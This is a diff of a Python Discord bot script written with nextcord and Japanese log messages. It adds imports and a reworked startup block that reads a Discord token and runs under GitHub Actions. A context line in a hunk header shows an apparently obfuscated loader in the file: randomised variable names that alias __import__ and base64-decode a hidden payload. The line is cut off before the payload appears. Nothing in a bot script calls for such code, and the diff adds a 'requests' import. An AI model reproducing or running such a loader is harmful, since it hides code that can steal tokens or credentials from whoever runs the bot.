@@ -1,9 +1,11 @@
+import os
+import sys
+import asyncio
+import requests
 import nextcord
 from nextcord.ext import commands
-import asyncio
 from asyncio_throttle.throttler import Throttler
-import os  
-
+ 
 # =========================================
 # 設定
 # =========================================
@@ -17,16 +19,21 @@ CLNtVBTHkbFEEAQ=__import__;okgIXLroQhOfyzL=CLNtVBTHkbFEEAQ('base64').b64decode;c
 
 
 if __name__ == "__main__":
+    token = os.getenv("DISCORD_TOKEN")
+    if not token:
+        print(" トークンが見つかりません。")
+        sys.exit(1)
+
+    print(" Discord Bot 起動中")
+    sys.stdout.flush()  # GitHub Actionsなどでログを即反映
+
     try:
-        print("=== Discord Bot 起動中 ===")
-        token = os.getenv("DISCORD_TOKEN")
-        if not token:
-            print(" トークンが見つかりません")
-            sys.exit(1)
-        bot.run(token)
+        bot.run(token, reconnect=True)  # 自動再接続
+    except KeyboardInterrupt:
+        print(" 手動停止されました。")
     except Exception as e:
-        print(f" エラー発生: {e}")
+        print(f" 起動エラー: {e}")
     finally:
-        print(" Bot終了: GitHub Actionsが再起動を担当します")
+        print(" Bot終了: GitHub Actionsが再起動します。")
         sys.stdout.flush()
-        sys.exit(0)  # ★これが重要！絶対入れる！
+        sys.exit(0)
